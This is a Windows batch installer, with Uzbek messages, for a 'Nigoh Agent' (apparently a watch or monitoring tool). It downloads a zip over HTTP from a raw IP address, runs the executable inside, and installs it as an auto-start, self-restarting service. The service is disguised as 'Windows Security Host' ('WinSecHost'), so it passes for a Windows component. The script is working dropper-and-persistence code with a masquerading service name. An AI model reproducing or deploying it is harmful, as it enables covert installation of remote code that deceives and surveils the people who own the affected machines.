@echo off
setlocal enabledelayedexpansion

:: ============================================================
::  Nigoh Agent - Installer
::  Admin huquqi bilan ishga tushiring
:: ============================================================

net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [XATO] Iltimos, BAT faylni "Run as administrator" bilan ishga tushiring.
    pause
    exit /b 1
)

:: --- SOZLAMALAR ---
set DOWNLOAD_URL=http://89.39.94.50:8000/Nigoh.zip
set INSTALL_DIR=C:\ProgramData\Nigoh
set CORE_DIR=%INSTALL_DIR%\Core
set TEMP_ZIP=%TEMP%\nigoh_setup.zip
set SERVICE_EXE=%INSTALL_DIR%\WatchdogService.exe
set SERVICE_NAME=WinSecHost
set SERVICE_DISPLAY=Windows Security Host

echo.
echo [1/5] Yuklab olinmoqda: %DOWNLOAD_URL%
powershell -NoProfile -Command "try { Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%TEMP_ZIP%' -UseBasicParsing } catch { exit 1 }"
if %errorlevel% neq 0 (
    echo [XATO] Yuklab olish muvaffaqiyatsiz. Internet aloqasini tekshiring.
    pause
    exit /b 1
)
if not exist "%TEMP_ZIP%" (
    echo [XATO] ZIP fayl topilmadi.
    pause
    exit /b 1
)

echo [2/5] Papkalar tayyorlanmoqda...
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
if not exist "%CORE_DIR%"   mkdir "%CORE_DIR%"

echo [3/5] Arxivdan chiqarilmoqda...
powershell -NoProfile -Command "Expand-Archive -Path '%TEMP_ZIP%' -DestinationPath '%INSTALL_DIR%' -Force"
if %errorlevel% neq 0 (
    echo [XATO] Arxivdan chiqarish muvaffaqiyatsiz.
    del /f /q "%TEMP_ZIP%" >nul 2>&1
    pause
    exit /b 1
)
del /f /q "%TEMP_ZIP%" >nul 2>&1
echo        ZIP o'chirildi.

echo [4/5] Watchdog service o'rnatilmoqda...
sc query %SERVICE_NAME% >nul 2>&1
if %errorlevel% equ 0 (
    sc stop %SERVICE_NAME% >nul 2>&1
    timeout /t 2 /nobreak >nul
    sc delete %SERVICE_NAME% >nul 2>&1
    timeout /t 1 /nobreak >nul
)

if not exist "%SERVICE_EXE%" (
    echo [XATO] WatchdogService.exe topilmadi: %SERVICE_EXE%
    echo        ZIP ichida WatchdogService.exe bo'lishi kerak.
    pause
    exit /b 1
)

sc create %SERVICE_NAME% binpath= "\"%SERVICE_EXE%\"" start= auto DisplayName= "%SERVICE_DISPLAY%"
sc description %SERVICE_NAME% "Windows Security Host background service"
sc failure %SERVICE_NAME% reset= 60 actions= restart/3000/restart/5000/restart/10000

echo [5/5] Service ishga tushirilmoqda...
sc start %SERVICE_NAME%
if %errorlevel% neq 0 (
    echo [OGOHLANTIRISH] Service ishga tushmadi. Keyingi qayta yoqishda avtomatik boshlanadi.
) else (
    echo        Service muvaffaqiyatli ishga tushdi.
)

echo.
echo ============================================================
echo  O'rnatish muvaffaqiyatli tugadi!
echo  Service: %SERVICE_NAME%  ^|  Joyi: %INSTALL_DIR%
echo ============================================================
echo.
pause
exit /b 0
